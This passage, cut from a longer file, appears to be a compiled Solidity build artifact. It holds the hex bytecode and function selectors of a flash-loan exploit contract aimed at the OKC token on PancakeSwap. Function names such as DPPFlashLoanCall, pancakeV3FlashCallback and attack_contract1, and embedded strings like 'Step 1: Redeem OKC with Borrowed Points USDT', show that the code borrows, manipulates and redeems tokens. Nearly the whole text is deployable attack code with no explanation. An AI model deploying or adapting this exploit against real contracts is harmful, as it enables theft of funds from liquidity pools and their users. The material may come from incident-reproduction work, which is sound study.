526001600160a01b03918216600482015260248101849052929350169063a9059cbb906044016020604051808303815f875af1158015610132573d5f5f3e3d5ffd5b505050506040513d601f19601f820116820180604052508101906101569190610258565b506001546040516370a0823160e01b81523060048201525f916001600160a01b0316906370a0823190602401602060405180830381865afa15801561019d573d5f5f3e3d5ffd5b505050506040513d601f19601f820116820180604052508101906101c19190610241565b60015460025460405163a9059cbb60e01b81526001600160a01b03918216600482015260248101849052929350169063a9059cbb906044016020604051808303815f875af1158015610215573d5f5f3e3d5ffd5b505050506040513d601f19601f820116820180604052508101906102399190610258565b50505061027e565b5f60208284031215610251575f5ffd5b5051919050565b5f60208284031215610268575f5ffd5b81518015158114610277575f5ffd5b9392505050565b61039f8061028b5f395ff3fe608060405234801561000f575f5ffd5b506004361061004a575f3560e01c806337a8bb501461004e57806393ca36691461007e578063c54e44eb14610091578063dc701194146100a3575b5f5ffd5b600154610061906001600160a01b031681565b6040516001600160a01b0390911681526020015b60405180910390f35b600254610061906001600160a01b031681565b5f54610061906001600160a01b031681565b6100b66100b13660046102bf565b6100c4565b604051908152602001610075565b60408051808201909152601681527503a3930b739b332b92fb0b6361039b4bd329034b99d160551b60208201525f9030803b91610101908361022f565b6040516370a0823160e01b81523060048201525f906001600160a01b038716906370a0823190602401602060405180830381865afa158015610145573d5f5f3e3d5ffd5b505050506040513d601f19601f8201168201806040525081019061016991906102f0565b60405163a9059cbb60e01b81526001600160a01b038781166004830152602482018390529192509087169063a9059cbb906044016020604051808303815f875af11580156101b9573d5f5f3e3d5ffd5b505050506040513d601f19601f820116820180604052508101906101dd9190610307565b156101ec579250610229915050565b60405162461bcd60e51b815260206004820152600e60248201526d3a3930b739b332b91032b93937b960911b604482015260640160405180910390fd5b92915050565b610274828260405160240161024592919061032d565b60408051601f198184030181529190526020810180516001600160e01b0316632d839cb360e21b179052610278565b5050565b61028181610284565b50565b80516a636f6e736f6c652e6c6f67602083015f808483855afa5050505050565b80356001600160a01b03811681146102ba575f5ffd5b919050565b5f5f604083850312156102d0575f5ffd5b6102d9836102a4565b91506102e7602084016102a4565b90509250929050565b5f60208284031215610300575f5ffd5b5051919050565b5f60208284031215610317575f5ffd5b81518015158114610326575f5ffd5b9392505050565b604081525f83518060408401528060208601606085015e5f606082850101526060601f19601f830116840101915050826020830152939250505056fea2646970667358221220ea6b26a0548e2c3af8e5a6d543942dc48156b4c086d7bc5a9aa4df86e023252064736f6c634300081c0033416476616e63652043616c63756c6174696f6e20436f6e74726163742041646472657373286e65775f61747461636b5f636f6e747261637432293a20416476616e63652043616c63756c6174696f6e20436f6e74726163742041646472657373286e65775f61747461636b5f636f6e747261637433293a202d2d2d205374657020313a2052656465656d204f4b43207769746820426f72726f77656420506f696e74732055534454a2646970667358221220d1ff6821350c0c88d493ef83df9b809a4b38b6dc02bdcb8fb6830a530d50975564736f6c634300081c0033","linkReferences":{}},"methodIdentifiers":{"DPP1()":"874a3cb7","DPP2()":"eda0b70a","DPP3()":"8872a699","DPP4()":"0d294ec9","DPP5()":"da7c6f28","DPPFlashLoanCall(address,uint256,uint256,bytes)":"7ed1f1dd","OKC()":"37a8bb50","USDT()":"c54e44eb","attack_contract1()":"9e302b8a","attack_contract2()":"c5440a3e","calculateAddress(address,uint256)":"807e72d7","expect1()":"6b5b937f","getTokenPrice()":"4b94f50e","minerPool()":"6eaad3c6","nonce()":"affed0e0","pancakeCall(address,uint256,uint256,bytes)":"84800812","pancakePair_USDT_OKC()":"df8d573f","pancakeRouter()":"c21ebd07","pancakeV3FlashCallback(uint256,uint256,bytes)":"a1d48336","pancakeV3Pool()":"69508cc6"},"id":365}